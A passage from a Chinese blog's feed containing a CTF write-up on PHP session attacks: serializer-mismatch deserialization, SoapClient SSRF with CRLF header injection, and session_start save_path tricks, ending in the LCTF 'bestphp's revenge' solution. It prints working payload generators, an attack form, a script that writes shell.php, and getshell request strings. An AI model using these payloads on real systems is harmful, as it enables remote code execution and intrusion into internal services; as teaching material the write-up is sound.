class="keyword">$this</span>-&gt;handle = $handle;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle-&gt;getFlag();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> $token_flag;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token_flag = <span class="keyword">$this</span>-&gt;token = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token = &amp;<span class="keyword">$this</span>-&gt;token_flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token_flag = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token === <span class="keyword">$this</span>-&gt;token_flag)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line">                <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file,<span class="keyword">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$flag = <span class="keyword">new</span> Flag(<span class="string">"flag.php"</span>);</span><br><span class="line">$handle = <span class="keyword">new</span> Handle($flag);</span><br><span class="line"><span class="keyword">echo</span> serialize($handle).<span class="string">"\n"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>现在看来真的是很麻烦啊，其实我只需要篡改几个属性完成攻击就行了，为什么要那么多花里胡哨的东西，精简后代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123;       </span><br><span class="line">    <span class="keyword">private</span> $handle;        </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;           </span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle = <span class="keyword">new</span> flag();       </span><br><span class="line">    &#125;&#125;     </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;      </span><br><span class="line">    <span class="keyword">public</span> $file=<span class="string">'flag.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> $token_flag;</span><br><span class="line">    <span class="keyword">public</span> $token;            </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token=&amp;<span class="keyword">$this</span>-&gt;token_flag;</span><br><span class="line"></span><br><span class="line">&#125;  &#125;</span><br><span class="line"></span><br><span class="line">$li=<span class="keyword">new</span> Handle();</span><br><span class="line"><span class="keyword">echo</span> serialize($li);</span><br></pre></td></tr></table></figure>

<p>这部分代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($handle)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;handle = $handle;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>自己以前的沙雕想法就是一个要给<code>__construct函数一个参数</code>，并且在<code>new</code>的时候传入，其实这就是一个属性问题而已，只不过二者用于修改属性的方式不太相同，我完全也可以通过如下不传参的方式进行属性修改</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;           </span><br><span class="line">    <span class="keyword">$this</span>-&gt;handle = <span class="keyword">new</span> flag();       </span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>同样可以得到相同结果，因为属性篡改后的结果是一样的。最终效果如下：</p>
<p><img src="https://s2.ax1x.com/2019/07/09/ZsHrTO.png" alt="ZsHrTO.png"></p>
<p>通过这波思考还是收获了很多了，更加深刻的理解了<code>&quot;属性篡改攻击&quot;</code>。</p>
<p>好了，言归正传，题目源码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//A webshell is wait for you</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mdzz = <span class="string">'phpinfo();'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'phpinfo'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $m = <span class="keyword">new</span> OowoO();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    highlight_string(file_get_contents(<span class="string">'index.php'</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>很简单的反序列化，查看一下<code>phpinfo</code>，发现序列化引擎用的是<code>php_serialize</code>,而本题目所设置的引擎是<code>php</code>，这就符合了我们的利用环境，php引擎直接将value部分反序列化完成攻击。首先还是给出攻击表单</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;form action=<span class="string">"http://web.jarvisoj.com:32784/index.php"</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span> vaule=<span class="string">'|O:5:"OowoO":1:&#123;s:4:"mdzz";s:36:"print_r(scandir(dirname(__FILE__)));";&#125;'</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">"file"</span> name=<span class="string">"file1"</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">"file"</span> name=<span class="string">"file2"</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<p>反序列化脚本：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz=<span class="string">'print_r(scandir(dirname(__FILE__)));'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$obj = <span class="keyword">new</span> OowoO();</span><br><span class="line"><span class="keyword">echo</span> serialize($obj);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>在反序列化后的结果前面加一个竖线。最终攻击截图</p>
<p><img src="https://s2.ax1x.com/2019/07/09/Zsb429.png" alt="Zsb429.png"></p>
<p>当时自己还思考..要不要加一个<code>PHPSESSID</code>，打的时候发现自己真的是多虑打，访问<code>index.php</code>自带<code>PHPSESSID</code>。</p>
<p>第二道题，安恒杯的一个，源码如下：</p>
<p>class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_string(file_get_contents(basename($_SERVER[<span class="string">'PHP_SELF'</span>])));</span><br><span class="line"><span class="comment">//show_source(__FILE__);</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo1</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $varr;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;varr = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(file_exists(<span class="keyword">$this</span>-&gt;varr))&#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;文件"</span>.<span class="keyword">$this</span>-&gt;varr.<span class="string">"存在&lt;br&gt;"</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"&lt;br&gt;这是foo1的析构函数&lt;br&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo2</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $varr;</span><br><span class="line">        <span class="keyword">public</span> $obj;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;varr = <span class="string">'1234567890'</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;obj = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;obj-&gt;execute();</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;varr;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__desctuct</span><span class="params">()</span></span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"&lt;br&gt;这是foo2的析构函数&lt;br&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo3</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $varr;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">execute</span><span class="params">()</span></span>&#123;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;varr);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__desctuct</span><span class="params">()</span></span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"&lt;br&gt;这是foo3的析构函数&lt;br&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span>(<span class="string">"./class.php"</span>);</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">$obj = <span class="keyword">new</span> foo1();</span><br><span class="line"></span><br><span class="line">$obj-&gt;varr = <span class="string">"phpinfo.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>反序列化<code>exp</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo1</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $varr;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;varr = <span class="keyword">new</span> foo2();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo2</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $varr;</span><br><span class="line">        <span class="keyword">public</span> $obj;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;varr = <span class="string">'1234567890'</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;obj = <span class="keyword">new</span> foo3();</span><br><span class="line">        &#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo3</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $varr=<span class="string">"phpinfo();"</span>;&#125;</span><br><span class="line"></span><br><span class="line">$a=<span class="keyword">new</span> foo1();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure>

<p>同样将生成的反序列化字符串前面加一个<code>|</code>，最后用表单发送一下。复现成功截图</p>
<p><img src="https://s2.ax1x.com/2019/07/09/ZsXprR.png" alt="ZsXprR.png"></p>
<h3 id="利用php原生类SoupClient中-call方法进行SSRF"><a href="#利用php原生类SoupClient中-call方法进行SSRF" class="headerlink" title="利用php原生类SoupClient中__call方法进行SSRF"></a>利用php原生类SoupClient中__call方法进行SSRF</h3><p>这个知识点是在学习一些<code>php-Session</code>安全问题的同时学到的，感觉作用很大，来记录一下。</p>
<p>这个内置类在<code>php5,php7</code>都是存在的。</p>
<h4 id="SOAP介绍"><a href="#SOAP介绍" class="headerlink" title="SOAP介绍"></a>SOAP介绍</h4><blockquote>
<p>SOAP是webService三要素（SOAP、WSDL(WebServicesDescriptionLanguage)、UDDI(UniversalDescriptionDiscovery andIntegration)）之一：WSDL 用来描述如何访问具体的接口， UDDI用来管理，分发，查询webService ，SOAP（简单对象访问协议）是连接或Web服务或客户端和Web服务之间的接口。<br>其采用HTTP作为底层通讯协议，XML作为数据传送的格式。</p>
</blockquote>
<p><img src="https://s2.ax1x.com/2019/07/09/Z6S8Og.png" alt="Z6S8Og.png"></p>
<p><code>SOAP</code>中最常用的也是最方便的是<code>NO-WSDL</code>模式，<code>WSDL</code>模式下使用<code>WSDL</code>文件名作为参数，并且从<code>WSDL</code>中提取服务所需信息。</p>
<p><code>NO-WSDL</code>模式下，使用参数来传递使用的信息。用法如下:</p>
<p><img src="https://www.github.com/coomrade/Img/raw/master/pics/1540540393770.png" alt="enter description here"></p>
<p>注意点：</p>
<p>如果在WSDL模式下工作，则此参数是可选的。如果在非WSDL模式下工作，则必须设置<code>location和uri</code>选项，其中：</p>
<ul>
<li><strong>location</strong>是要将请求发送到的SOAP服务器的URL</li>
<li><strong>uri</strong>是SOAP服务的目标名称空间。</li>
</ul>
<p>对如下代码进行实验</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'uri'</span>=&gt;<span class="string">'1'</span>, <span class="string">'location'</span>=&gt;<span class="string">'http://your_vps:port'</span>));</span><br><span class="line">$b = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line">$c = unserialize($b);</span><br><span class="line">$c-&gt;a();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>在自己的vps监听一下</p>
<p><img src="https://s2.ax1x.com/2019/07/09/ZyoiDK.png" alt="ZyoiDK.png"></p>
<p>通过此方法即可造成<code>SSRF</code>攻击，下面是实验代码</p>
<p>local.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>]==<span class="string">'127.0.0.1'</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'hi'</span>;</span><br><span class="line">	@$a=$_POST[<span class="number">1</span>];</span><br><span class="line">	@<span class="keyword">eval</span>($a);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>test.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target = <span class="string">'http://127.0.0.1/local.php'</span>;</span><br><span class="line">$post_string = <span class="string">'1=file_put_contents("shell.php", "&lt;?php phpinfo();?&gt;");'</span>;</span><br><span class="line">$headers = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'X-Forwarded-For: 127.0.0.1'</span>,</span><br><span class="line">    <span class="string">'Cookie: xxxx=1234'</span></span><br><span class="line">    );</span><br><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target,<span class="string">'user_agent'</span>=&gt;<span class="string">'wupco^^Content-Type: application/x-www-form-urlencoded^^'</span>.join(<span class="string">'^^'</span>,$headers).<span class="string">'^^Content-Length: '</span>.(string)strlen($post_string).<span class="string">'^^^^'</span>.$post_string,<span class="string">'uri'</span>      =&gt; <span class="string">"aaab"</span>));</span><br><span class="line"></span><br><span class="line">$aaa = serialize($b);</span><br><span class="line">$aaa = str_replace(<span class="string">'^^'</span>,<span class="string">'%0d%0a'</span>,$aaa);</span><br><span class="line">$aaa = str_replace(<span class="string">'&amp;'</span>,<span class="string">'%26'</span>,$aaa);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$c=unserialize(urldecode($aaa));</span><br><span class="line">$c-&gt;a();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这段代码运行的过程就是利用了</p>
<p>成功生成shell.php</p>
<p><img src="https://s2.ax1x.com/2019/07/09/ZyTzOx.png" alt="ZyTzOx.png"></p>
<p>其实<code>SoapClient</code>主要攻击点在于<code>location</code>实现的ssrf，同时去配合<code>CRLF</code>就可以控制<code>POST</code>报文，打出我们想要的内容。</p>
<h3 id="有趣的session-start-函数"><a href="#有趣的session-start-函数" class="headerlink" title="有趣的session_start()函数"></a>有趣的<code>session_start()</code>函数</h3><p>先放一道题来看一下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    ini_set(<span class="string">'open_basedir'</span>, <span class="string">'/var/www/html:/tmp'</span>);</span><br><span class="line">    $file = <span class="string">'function.php'</span>;</span><br><span class="line">    $func = <span class="keyword">isset</span>($_GET[<span class="string">'function'</span>])?$_GET[<span class="string">'function'</span>]:<span class="string">'filters'</span>; </span><br><span class="line">    call_user_func($func,$_GET);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">    session_start();</span><br><span class="line">    $_SESSION[<span class="string">'name'</span>] = $_POST[<span class="string">'name'</span>];</span><br><span class="line">    <span class="keyword">if</span>($_SESSION[<span class="string">'name'</span>]==<span class="string">'admin'</span>)&#123;</span><br><span class="line">        header(<span class="string">'location:admin.php'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以通过思路变量覆盖将file覆盖为<code>php://filter</code>读取base64的形式,将题目源码读取出来。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filters</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span>($data <span class="keyword">as</span> $key=&gt;$value)&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/eval|assert|exec|passthru|glob|system|popen/i'</span>,$value))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Do not hack me!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">hello admin</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_SESSION[<span class="string">'name'</span>]))&#123;</span><br><span class="line">    session_start();</span><br><span class="line">    <span class="comment">#echo 'hello ' + $_SESSION['name'];</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'you must login with admin'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>其实这两个文件没有什么用，关键点还是文件包含去<code>getshell</code>。</p>
<p>我们可以通过<code>session_start</code>函数重新开始一个<code>session</code>会话,并且修改session的<code>save_path</code>,这样就可以通过包含open_basedir限制的目录来<code>getshell</code>了.payload如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function&#x3D;session_start&amp;save_path&#x3D;&#x2F;tmp</span><br></pre></td></tr></table></figure>

<p>同时POST <code>name=&lt;?php phpinfo();?&gt;</code>，在/tmp目录下生成<code>session</code>文件,最后通过文件包含加变量覆盖进行<code>getshell</code>。payload如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function&#x3D;extract&amp;file&#x3D;&#x2F;tmp&#x2F;sess_your_PHPSESSID</span><br></pre></td></tr></table></figure>

<p><strong>通过上面的例子我们不难发现一个问题，就是<code>session_start</code>函数的一些危险作用，通过<code>session_start</code>我们可以更改session文件的储存位置，进一步来getshell，还可以改变处理序列化数据的引擎来造成反序列化漏洞甚至配合着php的soap类打出ssrf等高危操作。</strong></p>
<h4 id="LCTF的bestphp’s-revenge"><a href="#LCTF的bestphp’s-revenge" class="headerlink" title="LCTF的bestphp’s revenge"></a>LCTF的bestphp’s revenge</h4><p>题目源码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$b = <span class="string">'implode'</span>;</span><br><span class="line">call_user_func($_GET[f],$_POST);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[name]))&#123;</span><br><span class="line">    $_SESSION[name] = $_GET[name];</span><br><span class="line">&#125;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">$a = <span class="keyword">array</span>(reset($_SESSION),<span class="string">'welcome_to_the_lctf2018'</span>);</span><br><span class="line">call_user_func($b,$a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>首先需要知道一些小知识</p>
<p><code>call_user_func</code>函数：call_user_func函数会把第一参数当作回调函数，后面的则充当为回调函数的参数。</p>
<p><strong>当第一个参数是数组时候，则把第一个值当类名，第二个当作函数方法来调用</strong>（这里也正式本题目需要用到的）</p>
<p>第二个文件<code>flag.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">session_start();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'only localhost can get flag!'</span>;</span><br><span class="line">$flag = <span class="string">'LCTF&#123;*************************&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">"REMOTE_ADDR"</span>]===<span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line">       $_SESSION[<span class="string">'flag'</span>] = $flag;</span><br><span class="line">   &#125;</span><br><span class="line">only localhost can get flag!</span><br></pre></td></tr></table></figure>

<p>这里用的是<code>REMOTE_ADDR</code>去判断用户的真实IP的，所以那些伪造loaclhost的方法都是没用的，只能去思考SSRF的攻击手段，（这里就会考虑到用Soap去SSRF),但是我们并没有反序列化点如<code>unserialize</code>函数和引起<code>phar</code>反序列化的函数，但是这里有很多Session的操作，所以可以想到利用序列化引擎的不同造成反序列化，而我们正好可以通过<code>session_start</code>函数重置序列化引擎造成反序列化.</p>
<p>最终理清攻击链条：</p>
<ul>
<li>通过<code>session_start</code>函数更改序列化引擎，将我们构造好的反序列化数据传入。</li>
<li>再次访问页面，数据被成功反序列化，同时将序列化引擎更改，造成攻击，再去调用<code>SoapClient</code>类中不存在的welcome方法，触发<code>__call</code>方法，使得在非WSDL下，直接通过我们构造的<code>location</code>参数去获得<code>session</code>中的flag，回到主页面，flag被打出来。</li>
</ul>
<p>过程如下：<br>通过如下脚本生成反序列化数据：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target = <span class="string">"http://127.0.0.1/flag.php"</span>;</span><br><span class="line">$huaiqiu = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target,</span><br><span class="line">                              <span class="string">'user_agent'</span> =&gt; <span class="string">"lihuaiqiu\r\nCookie: PHPSESSID=ac8k33aggshj3eo9dqo5as6g63\r\n"</span>,<span class="string">'uri'</span> =&gt; <span class="string">"123"</span>));</span><br><span class="line">$payload = urlencode(serialize($huaiqiu));</span><br><span class="line"><span class="keyword">echo</span> $payload;</span><br></pre></td></tr></table></figure>

<p>并在反序列化的数据前面加入竖线，并且通过Session_start重置序列化引擎，将反序列化数据写入Session文件。</p>
<p><img src="https://s2.ax1x.com/2019/07/09/Z6Vqrq.png" alt="Z6Vqrq.png"></p>
<p>最终通过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">f=extract&amp;name=SoapClient 同时POST b=call_user_func</span><br></pre></td></tr></table></figure>

<p>调用Soapclient类中不存在的welcome方法，触发<code>__call</code>函数，完成location,拿到Session中的flag，回到本页面dump出来。最终结果：</p>
<p><img src="https://s2.ax1x.com/2019/07/09/Z6ZYFS.png" alt="Z6ZYFS.png"></p>
<h3 id="思考总结"><a href="#思考总结" class="headerlink" title="思考总结"></a>思考总结</h3><p>对于Session的攻击点，有如下几种:</p>
<ul>
<li>条件竞争发送与<code>session.upload_progress.name</code>同名字的变量，利用LFI进行getshell.</li>
<li>序列化引擎处理不当造成反序列化漏洞，配合PHP内置类Soap可打出SSRF的效果</li>
<li><code>session_start</code>函数可控，如果该函数可控的话，攻击者可以通过改变session的储存位置进行getshell，或者改变序列化引擎，造成反序列漏洞，甚至配合Soap类以及CRLF漏洞完成内网攻击。所以由此可见，暴露出phpinfo界面的危害还是蛮大的。</li>
</ul>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.smi1e.top/lctf2018-bestphps-revenge-详细题解/" target="_blank" rel="noopener">https://www.smi1e.top/lctf2018-bestphps-revenge-%e8%af%a6%e7%bb%86%e9%a2%98%e8%a7%a3/</a></p>
<p><a href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html#_label1_0" target="_blank" rel="noopener">https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html#_label1_0</a></p>
<p>[<a href="https://jsproxy.ga/-----https://skysec.top/2018/11/17/2018-Xctf%20Final&amp;LCTF-Bestphp/]" target="_blank" rel="noopener">https://jsproxy.ga/-----https://skysec.top/2018/11/17/2018-Xctf%20Final&amp;LCTF-Bestphp/]</a>(<a href="https://jsproxy.ga/-----https://skysec.top/2018/11/17/2018-Xctf" target="_blank" rel="noopener">https://jsproxy.ga/-----https://skysec.top/2018/11/17/2018-Xctf</a> Final&amp;LCTF-Bestphp/)</p>
<p><a href="https://coomrade.github.io/2018/10/26/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB%E9%9D%A2%E6%8B%93%E5%B1%95%E6%8F%90%E9%AB%98%E7%AF%87/" target="_blank" rel="noopener">https://coomrade.github.io/2018/10/26/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB%E9%9D%A2%E6%8B%93%E5%B1%95%E6%8F%90%E9%AB%98%E7%AF%87/</a></p>
]]></content>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>prompt(1) to win</title>
    <url>/2019/10/20/prompt-1-to-win/</url>
